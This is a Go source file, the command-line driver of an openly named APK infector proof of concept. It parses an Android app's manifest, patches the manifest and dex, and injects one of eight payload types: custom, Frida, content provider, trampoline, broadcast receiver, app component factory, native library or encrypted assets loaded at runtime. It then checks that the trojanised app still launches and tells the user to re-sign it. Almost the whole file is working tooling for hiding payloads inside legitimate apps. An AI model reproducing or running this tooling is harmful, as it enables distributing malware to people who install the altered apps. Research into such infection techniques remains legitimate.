// author: Thatskriptkid (www.orderofsixangles.com)
// You can use my kaitai struct for binary manifest.
// https://github.com/thatskriptkid/Kaitai-Struct-Android-Manifest-binary-XML

package main

import (
	"encoding/xml"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/injector"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
)

var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject\n\t3 - provider inject\n\t4 - trampoline inject\n\t5 - receiver inject\n\t6 - app component factory inject\n\t7 - native payload (lib injection, see ARCHINOME_NATIVE_* env)\n\t8 - encrypted assets payload (dex in assets/, runtime DexClassLoader + reflection,\n\t    trigger selectable via ARCHINOME_ASSETS_VECTOR=appfactory|provider|receiver)"

func main() {

	//setup logging
	logFile, err := os.OpenFile("apkinfector.log", os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}

	defer logFile.Close()

	log.SetOutput(logFile)

	if os.Args[1] == "-h" {
		fmt.Println(help_str)
		return
	}

	if len(os.Args) < 5 || (os.Args[4] != "1" && os.Args[4] != "2" && os.Args[4] != "3" && os.Args[4] != "4" && os.Args[4] != "5" && os.Args[4] != "6" && os.Args[4] != "7" && os.Args[4] != "8") {
		fmt.Println(help_str)
		return
	}

	if os.Args[4] == "1" {
		utils.Payload_option = int(utils.Custom_payload)
	} else if os.Args[4] == "2" {
		utils.Payload_option = int(utils.Frida_payload)
	} else if os.Args[4] == "3" {
		utils.Payload_option = int(utils.Provider_payload)
	} else if os.Args[4] == "4" {
		utils.Payload_option = int(utils.Trampoline_payload)
	} else if os.Args[4] == "5" {
		utils.Payload_option = int(utils.Receiver_payload)
	} else if os.Args[4] == "6" {
		utils.Payload_option = int(utils.AppComponentFactory_payload)
	} else if os.Args[4] == "7" {
		utils.Payload_option = int(utils.Native_payload)
	} else if os.Args[4] == "8" {
		utils.Payload_option = int(utils.Assets_payload)
	}

	// if !(isValidFile(os.Args[1]) && isValidFile(os.Args[2])) {
	// 	fmt.Printf("Invalid file path %s %s", os.Args[1], os.Args[2])
	// 	return
	// }

	fmt.Println("Parsing APK...")
	if utils.Payload_option == int(utils.Native_payload) {
		// The native vector edits lib/<abi>/*.so only -- it never needs the
		// manifest, and split APKs have manifests this parser cannot handle.
		fmt.Println("	--Skipped: the native vector works on lib/<abi> only")
	} else {
		manifestPlainFile, err := os.Create(manifest.PlainPath) // create/truncate the file
		if err != nil {
			log.Panic("Failed to create AndroidManifest plaintext", err)
		} else {
			enc := xml.NewEncoder(manifestPlainFile)
			enc.Indent("", "	")
			manifest.ParseApk(os.Args[1], enc)
			//close before reading
			manifestPlainFile.Close()
		}
	}

	fmt.Println("Patching APK")
	if utils.Payload_option == int(utils.Provider_payload) {
		fmt.Println("\t--Patching manifest (provider inject)...")
		manifest.PatchProvider()
	} else if utils.Payload_option == int(utils.Trampoline_payload) {
		fmt.Println("\t--Patching manifest (trampoline inject)...")
		manifest.PatchTrampoline()
	} else if utils.Payload_option == int(utils.Receiver_payload) {
		fmt.Println("	--Patching manifest (receiver inject)...")
		manifest.PatchReceiver()
	} else if utils.Payload_option == int(utils.AppComponentFactory_payload) {
		fmt.Println("	--Patching manifest (app component factory inject)...")
		manifest.PatchAppComponentFactory()
	} else if utils.Payload_option == int(utils.Assets_payload) {
		// The loader stub is identical for every trigger -- only the manifest
		// entry differs, so the assets vector reuses the existing patchers.
		trigger := strings.ToLower(os.Getenv("ARCHINOME_ASSETS_VECTOR"))
		switch trigger {
		case "provider":
			fmt.Println("	--Patching manifest (assets payload, provider trigger)...")
			manifest.PatchProvider()
		case "receiver":
			fmt.Println("	--Patching manifest (assets payload, receiver trigger)...")
			manifest.PatchReceiver()
		case "", "appfactory":
			fmt.Println("	--Patching manifest (assets payload, appComponentFactory trigger)...")
			manifest.PatchAppComponentFactory()
		default:
			log.Panicf("unknown ARCHINOME_ASSETS_VECTOR %q (appfactory|provider|receiver)", trigger)
		}
	} else if utils.Payload_option == int(utils.Native_payload) {
		// The native vector does not touch the manifest or the dex at all.
		fmt.Println("	--Native vector: manifest and dex left untouched")
	} else {
		fmt.Println("\t--Patching manifest...")
		manifest.Patch()

		fmt.Println("	--Patching dex...")
		dex.Patch()
		// The stub dex is rewritten in place (class rename + offset fixups). A
		// fixture that no longer matches those assumptions yields a structurally
		// broken dex, and ART then fails to load the wrapper class — i.e. the
		// app is bricked on the device. Refuse to write such an APK.
		if err := dex.Validate(dex.StubPath(), manifest.WrapperClassName()); err != nil {
			log.Panicf("dex patch produced an unusable stub dex (%v) - refusing to write %s", err, os.Args[2])
		}
		// The wrapper must extend the host's own Application class, otherwise
		// ART cannot resolve it and the app dies at start.
		if host := manifest.HostAppClassName(); host != "" {
			if err := dex.ValidateSuperclass(dex.StubPath(), manifest.WrapperClassName(), host); err != nil {
				log.Panicf("stub dex superclass mismatch (%v) - refusing to write %s", err, os.Args[2])
			}
		}
	}

	fmt.Println("Injecting...")
	injector.Inject(os.Args[1], os.Args[2])

	utils.Cleanup()

	fmt.Println("Done! Now you should sign your apk")
}
